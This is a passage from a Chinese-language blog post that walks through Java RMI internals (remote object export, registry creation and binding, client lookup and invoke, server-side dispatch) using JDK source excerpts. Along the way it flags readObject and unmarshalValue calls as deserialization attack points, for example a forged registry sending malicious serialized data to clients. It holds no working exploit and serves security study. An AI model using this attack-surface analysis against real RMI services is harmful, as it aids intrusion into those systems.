class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">this</span>.port = port;</span><br><span class="line">    exportObject((Remote) <span class="built_in">this</span>, port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处的<code>exportobject</code>在指定端口上导出一个远程对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, <span class="type">int</span> port)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处的<code>UnicastServerRef</code>是服务端对于网络请求的封装对象，实际上服务端发起的请求先是通过<code>UnicastServerRef</code>操作，而<code>UnicastServerRef</code>中操作是通过<code>StreamRemoteCall</code>来进行请求，继承的是LiveRef类的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastServerRef</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(port));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>LiveRef</code>类中新建了对象<code>ID</code>，并传入端口号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>((<span class="keyword">new</span> <span class="title class_">ObjID</span>()), port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>port</code>传入了<code>TCPEndpoint</code>类的<code>getLocalEndpoint</code>方法，猜测这里是建立连接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(ObjID objID, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(objID, TCPEndpoint.getLocalEndpoint(port), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getLocalEndpoint</code>方法中增加了两个参数调用了同名方法，调用的<code>getLocalEndpoint</code>是获取本地<code>IP</code>值和传入的端口号，此时端口号还是0</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TCPEndpoint <span class="title function_">getLocalEndpoint</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getLocalEndpoint(port, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回到上面<code>LiveRef</code>的<code>this</code>方法中，此时<code>LiveRef</code>对象中的参数如下</p><p><img src="/post/a787da62/image-20240614141242918.png" alt="image-20240614141242918" style="zoom:50%;"></p><p>返回到上面的<code>UnicastServerRef</code>的<code>super</code>方法中，此处<code>UnicastServerRef</code>对象的参数如下</p><p><img src="/post/a787da62/image-20240614141424469.png" alt="image-20240614141424469" style="zoom:33%;"></p><p>返回到<code>UnicastRemoteObject</code>的<code>exportObject</code>方法中，这里会调用传入的<code>UnicastServerRef</code>对象的<code>exportObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">        ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sref.exportObject(obj, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>UnicastServerRef</code>对象的<code>exportObject</code>方法中实现了创建<code>RemoteObjImpl</code>对象的动态代理<code>stub</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</span><br></pre></td></tr></table></figure><p>这里的<code>getClientRef()</code>会新建一个<code>UnicastRef</code>对象，而这里的<code>ref</code>就是创建的<code>LiveRef</code>对象，<code>UnicastRef</code>是客户端对于网络请求的封装对象，实际上客户端发起的请求先是通过<code>UnicastRef</code>操作，而<code>UnicastRef</code>中操作是通过<code>StreamRemoteCall</code>来进行请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> RemoteRef <span class="title function_">getClientRef</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(ref);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ------------------------------------</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastRef</span><span class="params">(LiveRef liveRef)</span> &#123;</span><br><span class="line">    ref = liveRef;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的<code>stub</code>就是为<code>getClientRef()</code>的返回创建一个代理对象，<code>stub</code>的数据如下</p><p><img src="/post/a787da62/image-20240614142318346.png" alt="image-20240614142318346" style="zoom:50%;"></p><p>然后新建<code>target</code>对象，传入参数分别为<code>RemoteObjImpl</code>实现类（包含p~ort和<code>UnicastServerRef</code>对象），<code>UnicastServerRef</code>对象本身，<code>UnicastRef</code>代理对象，<code>LiveRef</code>的<code>objID</code>，<code>permanent</code>为<code>false</code>，代表非永久</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br></pre></td></tr></table></figure><p>然后调用<code>LiveRef</code>对象的<code>exportObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ref.exportObject(target);</span><br></pre></td></tr></table></figure><p>然后调用<code>ep</code>(<code>TCPEndpoint</code>对象)的<code>exportObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    ep.exportObject(target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后调用<code>TCPTransport</code>的方法，<code>TCPTransport</code>是在上面<code>TCPEndpoint</code>的<code>getLocalEndpoint</code>定义的，定义的参数包括<code>ip</code>和端口号，应该是用于建立连接的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    transport.exportObject(target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是<code>TCPTransport</code>对象的参数信息</p><p><img src="/post/a787da62/image-20240614143127357.png" alt="image-20240614143127357" style="zoom:50%;"></p><p>在<code>TCPTransport</code>的<code>exportObject</code>方法中实现了<code>listen</code>进行端口监听</p><p><img src="/post/a787da62/image-20240614143326427.png" alt="image-20240614143326427" style="zoom:33%;"></p><p>在<code>listen</code>函数中实现了创建服务端<code>socket</code>，创建新进程</p><p><img src="/post/a787da62/image-20240614143425352.png" alt="image-20240614143425352" style="zoom: 33%;"></p><p><code>TCPTransport</code>对象的变量更新如下</p><p><img src="/post/a787da62/image-20240614143618651.png" alt="image-20240614143618651" style="zoom:50%;"></p><p>至此，服务端远程服务创建完成，总的来说先确定<code>IP</code>，然后逐步创建客户端代理<code>Stub</code>(为了客户端能通过该代理和服务端通信)，然后创建连接<code>socket</code></p><h4 id="创建注册中心绑定">创建注册中心+绑定</h4><p>服务端创建注册中心和创建远程访问的流程类似，都是在某端口开启网络通信服务，个别参数有一定区别，创建注册中心指定端口号为1099（默认）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务端创建Registry对象</span></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br></pre></td></tr></table></figure><p><code>LocateRegistry</code>对象的<code>createRegistry</code>会创建<code>RegistryImpl</code>接口对象，并传入端口号1099</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">createRegistry</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryImpl</span>(port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>RegistryImpl</code>类的创建方法中，会创建<code>LiveRef</code>对象，该对象的创建中会通过<code>getLocalEndpoint</code>方法确定<code>IP</code>和端口号，以及初始化后面会使用的<code>TCPTransport</code>对象（无<code>socket</code>）</p><p><img src="/post/a787da62/image-20240614151130924.png" alt="image-20240614151130924" style="zoom:50%;"></p><p>返回的<code>lref</code>的返回如下</p><p><img src="/post/a787da62/image-20240614151343681.png" alt="image-20240614151343681" style="zoom: 33%;"></p><p>接着将<code>lref</code>作为参数传递到<code>UnicastServerRef</code>的新建方法中，和服务端创建远程服务类似，主要看此处的<code>setup</code>方法，在该方法中调用了<code>UnicastServerRef</code>对象的<code>exportObject</code>函数，此处的<code>permanent</code>参数传递为<code>true</code>代表永久</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setup</span><span class="params">(UnicastServerRef uref)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Server ref must be created and assigned before remote</span></span><br><span class="line"><span class="comment">     * object &#x27;this&#x27; can be exported.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ref = uref;</span><br><span class="line">    uref.exportObject(<span class="built_in">this</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>UnicastServerRef</code>对象的<code>exportObject</code>函数中创建代理，<code>getClientRef()</code>返回的是<code>UnicastRef</code>对象（包含创建的<code>LiveRef</code>对象）</p><p><img src="/post/a787da62/image-20240614151900691.png" alt="image-20240614151900691" style="zoom:50%;"></p><p>但是和创建远程服务不同，此处的<code>stub</code>返回的并不是一个代理，在<code>createProxy</code>方法中有一个<code>if</code>语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (forceStubUse ||</span><br><span class="line">    !(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>remoteClass</code>类作为参数传递的<code>stubClassExists</code>中判断<code>remoteClass_stub</code>类存在，就不通过代理创建方式创建<code>stub</code>，但是注册接口类<code>RegistryImpl_stub</code>是存在的，因此就会进入此处的<code>if</code>循环，进入此处的<code>createStub</code>方法，然后就会获取<code>RegistryImpl_stub</code>类的实例对象，而非代理对象，并以创建的<code>UnicastRef</code>对象作为实例创建参数</p><p>最后<code>stub</code>返回的是<code>RegistryImpl_stub</code>实例对象，接着又会进入此处<code>if</code>函数，执行<code>setSkeleton</code>函数，以<code>RegistryImpl</code>对象作为参数传递</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">    setSkeleton(impl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着又调用<code>Util</code>的<code>createSkeleton</code>方法</p><p><img src="/post/a787da62/image-20240614152708191.png" alt="image-20240614152708191" style="zoom:50%;"></p><p>相当于就是创建<code>RegistryImpl_Skel</code>的实例对象</p><p><img src="/post/a787da62/image-20240614152808214.png" alt="image-20240614152808214" style="zoom:50%;"></p><p>然后将设置好的</p><ul><li><p><code>impl</code>(<code>RegistryImpl</code>类，包含<code>Hashtable</code>类的<code>bindings</code>参数和<code>UnicastServerRef</code>类的<code>ref</code>参数，其中<code>ref</code>包含创建好的<code>skel</code>(<code>RegistryImpl_Skel</code>对象)，<code>ref</code>(<code>LiveRef</code>对象))，</p></li><li><p><code>this</code>(<code>UnicastServerRef</code>类，包含创建好的<code>skel</code>(<code>RegistryImpl_Skel</code>对象)，<code>ref</code>(<code>LiveRef</code>对象))，</p></li><li><p><code>stub</code>(<code>ResitryImpl_Stub</code>类，包含<code>UnicastRef</code>类的<code>ref</code>参数，<code>ref</code>包含创建的<code>LiveRef</code>对象)，</p></li></ul><p>作为参数新建<code>Target</code>变量，然后通过<code>LiveRef</code>类的<code>exportObject</code>方法建立<code>socket</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br><span class="line">ref.exportObject(target);</span><br></pre></td></tr></table></figure><p>然后就是绑定方法<code>bind</code>的使用，这里的<code>registry</code>就是创建的<code>RegistryImpl_Stub</code>类的实例对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务端将远程对象绑定到Registry对象</span></span><br><span class="line">registry.bind(<span class="string">&quot;remoteObj&quot;</span>, remoteObj);</span><br></pre></td></tr></table></figure><p>此处的<code>binding</code>初始化为空，因此会将传入的对象和<code>name</code>加入到<code>binding</code>列表中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String name, Remote obj)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span><br><span class="line">&#123;</span><br><span class="line">    checkAccess(<span class="string">&quot;Registry.bind&quot;</span>);</span><br><span class="line">    <span class="keyword">synchronized</span> (bindings) &#123;</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">curr</span> <span class="operator">=</span> bindings.get(name);</span><br><span class="line">        <span class="keyword">if</span> (curr != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AlreadyBoundException</span>(name);</span><br><span class="line">        bindings.put(name, obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，服务端代码介绍完毕</p><h3 id="客户端">客户端</h3><h4 id="客户端请求注册中心">客户端请求注册中心</h4><p>首先指定<code>host</code>和<code>port</code>获取<code>Registry</code>对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  客户端通过LocateRegistry.getRegistry方法获取Registry对象</span></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br></pre></td></tr></table></figure><p>再次调用同名函数<code>getRegistry</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> getRegistry(host, port, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后新建<code>LiveRef</code>对象，传入<code>IP</code>和<code>port</code>，再以创建的<code>LiveRef</code>作为参数创建<code>UnicastRef</code>对象，然后创建代理对象，相当于这里的获取实际上并不是获取，而是通过传入的参数在本地创建好<code>RegistryImpl_Stub</code>类的实例对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">LiveRef</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port, csf, <span class="literal">null</span>),</span><br><span class="line">                <span class="literal">false</span>);</span><br><span class="line"><span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span></span><br><span class="line">    (csf == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef) : <span class="keyword">new</span> <span class="title class_">UnicastRef2</span>(liveRef);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (Registry) Util.createProxy(RegistryImpl.class, ref, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>接着通过<code>lookup</code>寻找远程对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  客户端通过lookup方法获取远程对象</span></span><br><span class="line"><span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br></pre></td></tr></table></figure><p>在<code>lookup</code>中会调用<code>UnicastRef</code>的<code>newCall</code>，在<code>newCall</code>方法中会根据传入的参数创立连接，同时在<code>lookup</code>中将传入的远程对象名字作为参数传递到建立的连接对象的序列化的函数中，意味着是将该参数进行序列化传递给注册中心，注册中心会负责进行反序列化</p><p><img src="/post/a787da62/image-20240614163338442.png" alt="image-20240614163338442" style="zoom: 33%;"></p><p>返回的参数<code>var2</code>如下</p><p><img src="/post/a787da62/image-20240614163025294.png" alt="image-20240614163025294" style="zoom:50%;"></p><p>然后会调用<code>invoke</code>方法，<code>invoke</code>方法中会调用<code>call.executeCall();</code>，该方法就是处理客户端网络请求的方法</p><p>接着客户端会接受注册中心的返回结果，同样，要进行反序列化才能获取</p><p><img src="/post/a787da62/image-20240614163547092.png" alt="image-20240614163547092" style="zoom:33%;"></p><p><strong>因此攻击手段可以考虑，模拟注册中心，向客户端发送有危害的序列化代码，客户端在进行反序列化时则会产生漏洞</strong></p><p><strong>另外在<code>invoke</code>方法中，当产生异常<code>TransportConstants.ExceptionalReturn</code>时也会调用<code>readObject</code>方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">    Object ex;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ex = in.readObject();</span><br></pre></td></tr></table></figure><p>因此只要有<code>invoke</code>方法或者<code>readObject</code>方法都有可能产生威胁</p><h4 id="客户端请求服务端">客户端请求服务端</h4><p>此处客户端通过<code>lookup</code>方法获取远程对象<code>remoteObj</code>是一个动态代理对象，因此会执行<code>UnicastRef</code>的<code>invoke</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  客户端调用远程对象的方法</span></span><br><span class="line">System.out.println(remoteObj.sayHello(<span class="string">&quot;Hello, World!&quot;</span>));</span><br></pre></td></tr></table></figure><p>在<code>invoke</code>方法中，首先创建连接</p><p><img src="/post/a787da62/image-20240614164948844.png" alt="image-20240614164948844" style="zoom:50%;"></p><p>然后创建远程调用方法对象，然后将要传递的变量通过<code>marshaValue</code>进行序列化</p><p><img src="/post/a787da62/image-20240614165259985.png" alt="image-20240614165259985" style="zoom:33%;"></p><p><code>marshaValue</code>中就是对参数进行序列化</p><p><img src="/post/a787da62/image-20240614165327093.png" alt="image-20240614165327093" style="zoom:50%;"></p><p>然后又执行网络请求（这里主要是处理客户端和服务端通信的<code>JRMP</code>协议，当出现指定异常时可利用）</p><p>接着获取返回值然后通过<code>unmarshalValue</code>进行反序列化</p><p><img src="/post/a787da62/image-20240614165519789.png" alt="image-20240614165519789" style="zoom:50%;"></p><h3 id="客户端-服务端">客户端-服务端</h3><h4 id="客户端请求注册中心时的服务端">客户端请求注册中心时的服务端</h4><p>服务端在创建注册中心时实际上会将创建的所有东西都放在target中，然后创建开启网络监听，创建新线程，会新建skel实例，因此该实例应是服务端用于接收客户端的请求的，当客户端通过lookup寻找远程服务时，服务端应收到请求并返回远程服务对象，因此，主要查看RegistryImpl_Skel类定义的函数，<code>dispatch</code>函数的主要作用是接收并处理从客户端发送过来的请求。根据请求的内容，调用相应的方法来执行</p><p><img src="/post/a787da62/image-20240615143550267.png" alt="image-20240615143550267" style="zoom:50%;"></p><p>现在查看服务端创建远程对象时socket创建新进程的流程，也就是TCPTransport的listen函数，在这里面会创建新进程，执行类为AcceptLoop</p><p><img src="/post/a787da62/image-20240616101922514.png" alt="image-20240616101922514" style="zoom:33%;"></p><p>查看AcceptLoop的run方法</p><p><img src="/post/a787da62/image-20240616102003153.png" alt="image-20240616102003153" style="zoom:33%;"></p><p>查看executeAcceptLoop方法，这里面又执行了ConnectionHandler类</p><p><img src="/post/a787da62/image-20240616102039718.png" alt="image-20240616102039718" style="zoom:33%;"></p><p>ConnectionHandler类的run方法执行了run0方法，run0方法中有一个读取inputmessages的函数handleMessages,这里面应该就是读取客户端信息的函数，咋子handleMessages函数中会根据传输的不同字段值调用不同函数，默认是serviceCall函数</p><p><img src="/post/a787da62/image-20240616102632213.png" alt="image-20240616102632213" style="zoom:33%;"></p><p>在serviceCall函数中会获取创建过的target，此时的target</p><p><img src="/post/a787da62/image-20240616131547037.png" alt="image-20240616131547037" style="zoom: 33%;"></p><p>在此处增加断点，并发起客户端请求，接着会获取target里面的分发器，这时候获取到的分发器就是有skel的UnicastServerRef类对象，应该是处理客户端请求</p><p><img src="/post/a787da62/image-20240616102946645.png" alt="image-20240616102946645" style="zoom:50%;"></p><p>然后会调用disp(分发器)的dispatch方法</p><p><img src="/post/a787da62/image-20240616103126724.png" alt="image-20240616103126724" style="zoom:50%;"></p><p>在dispatch中如果skel并不是null就会调用oldDispatch方法，oldDispatch方法中会调用skel的dispatch方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (skel != <span class="literal">null</span>) &#123;</span><br><span class="line">    oldDispatch(obj, call, num);</span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>在skel的dispatch方法中，执行语句如下，当var3为0，代表绑定命令，1代表list命令，2代表lookup(从注册中心寻找对应的远程对象)...传入lookup的参数var7是通过反序列化读出来的，该处有被攻击可能性，此处所有的case都有readObject方法，都有被攻击的可能性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="comment">//..</span></span><br><span class="line">        var6.bind(var7, var8);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        String[] var97 = var6.list();</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var10 = var2.getInputStream();</span><br><span class="line">            var7 = (String)var10.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var89) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var89);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var90) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var90);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            var2.releaseInputStream();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var8 = var6.lookup(var7);</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        var6.rebind(var7, var8);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        var6.unbind(var7);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="客户端请求服务端时服务端">客户端请求服务端时服务端</h4><p>还是一样的运行流程，不同的是此时获取的target是如下信息，其中的stub变成了动态代理，也就是服务端创建远程服务建立的动态代理，前面的target是服务器创建注册中心时创建的RegistryImpl_stub类的新实例</p><p><img src="/post/a787da62/image-20240616131710853.png" alt="image-20240616131710853" style="zoom: 33%;"></p><p>此时的skel为null，此处不执行oldDispatch函数</p><p><img src="/post/a787da62/image-20240616132405085.png" alt="image-20240616132405085" style="zoom:33%;"></p><p>然后获取method方法，并调用logCall记录</p><p><img src="/post/a787da62/image-20240616132501602.png" alt="image-20240616132501602" style="zoom:33%;"></p><p>接着获取参数类型，并获取传递过来的参数，此处的unmarshalValue和上面分析的一样，是对参数进行反序列化（可利用）</p><p><img src="/post/a787da62/image-20240616132558249.png" alt="image-20240616132558249" style="zoom: 